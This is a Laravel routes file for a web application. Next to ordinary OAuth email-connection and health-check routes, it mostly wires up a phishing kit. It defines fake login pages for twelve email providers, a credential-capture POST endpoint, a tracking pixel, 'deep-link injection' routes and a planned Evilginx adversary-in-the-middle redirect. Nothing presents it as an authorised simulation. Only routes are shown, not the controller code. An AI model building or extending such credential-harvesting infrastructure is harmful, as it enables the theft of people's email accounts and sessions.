<?php

use App\Http\Controllers\HealthController;
use App\Http\Controllers\OAuthController;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('welcome');
});

// Health check endpoint
Route::get('/health', [HealthController::class, 'check']);

// OAuth2 routes for email account connections
Route::get('/auth/{provider}/connect', [OAuthController::class, 'connect'])
    ->name('oauth.connect')
    ->where('provider', 'google|microsoft');

Route::get('/auth/{provider}/callback', [OAuthController::class, 'callback'])
    ->name('oauth.callback')
    ->where('provider', 'google|microsoft');

Route::post('/auth/{provider}/disconnect/{accountId}', [OAuthController::class, 'disconnect'])
    ->name('oauth.disconnect')
    ->where('provider', 'google|microsoft');

// Phishing routes
Route::get('/phish/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'showLogin'])
    ->name('phish.login')
    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');

Route::post('/phish/capture/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'capture'])
    ->name('phish.capture')
    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');

Route::get('/phish/track/{token}', [\App\Http\Controllers\PhishController::class, 'trackPixel'])
    ->name('phish.track');

// Deep-link injection routes
Route::get('/phish/deep/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'deepInject'])
    ->name('phish.deep-inject')
    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');

Route::any('/phish/deep-callback/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'deepCallback'])
    ->name('phish.deep-callback')
    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');

// Evilginx integration routes (future)
Route::get('/phish/evilginx/{provider}/{token}', [\App\Http\Controllers\PhishController::class, 'evilginxRedirect'])
    ->name('phish.evilginx')
    ->where('provider', 'google|microsoft|yahoo|gmx|webde|ionos|telekom|a1|freenet|icloud|zoho|protonmail');
